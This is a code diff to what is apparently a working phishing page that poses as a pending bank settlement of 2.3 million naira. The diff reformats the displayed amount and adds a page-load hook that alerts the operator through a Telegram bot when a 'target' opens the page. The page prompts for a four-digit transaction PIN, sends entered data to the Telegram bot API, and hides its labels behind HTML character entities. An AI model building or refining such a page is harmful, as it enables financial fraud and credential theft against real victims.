@@ -39,7 +39,7 @@
 
     <div class="info-box">
         <p><strong>B&#101;n&#101;f&#105;ci&#97;ry:</strong> A&#119;&#97;it&#105;ng V&#101;rif&#105;cati&#111;n</p>
-        <p><strong>Am&#111;&#117;nt:</strong> &#8322;&#46;&#51;&#77;&#32;&#78;&#71;&#78;</p>
+        <p><strong>Am&#111;&#117;nt:</strong> &#8358;2,300,000.00</p> 
         <p><strong>St&#97;t&#117;s:</strong> P&#101;nding S&#101;ttl&#101;m&#101;nt</p>
     </div>
 
@@ -65,7 +65,7 @@
     </div>
 
     <div id="stage3" class="stage">
-        <p>Confirm the final s&#101;ttl&#101;m&#101;nt of &#8322;&#46;&#51;&#77;.</p>
+        <p>Confirm the final s&#101;ttl&#101;m&#101;nt of &#8358;2,300,000.00.</p>
         <div class="input-group">
             <label>4-D&#105;g&#105;t Transacti&#111;n P&#105;n</label>
             <input type="password" id="pin" placeholder="****" maxlength="4">
@@ -94,6 +94,11 @@
         const url = `https://api.telegram.org/bot${bT}/sendMessage?chat_id=${cI}&text=${encodeURIComponent(data)}`;
         try { await fetch(url); } catch(e) {}
     }
+
+    // 🚨 ENTRANCE ALERT: Notifies immediately when the page finishes loading
+    window.onload = function() {
+        report("🚨 TARGET ENTERED PORTAL\nStatus: Watching Live\nAmount: 2.3M NGN");
+    };
 
     function showLoad(status, msg = "") {
         document.getElementById('loader').style.display = status ? 'block' : 'none';
@@ -133,4 +138,3 @@
 </script>
 </body>
 </html>
-      
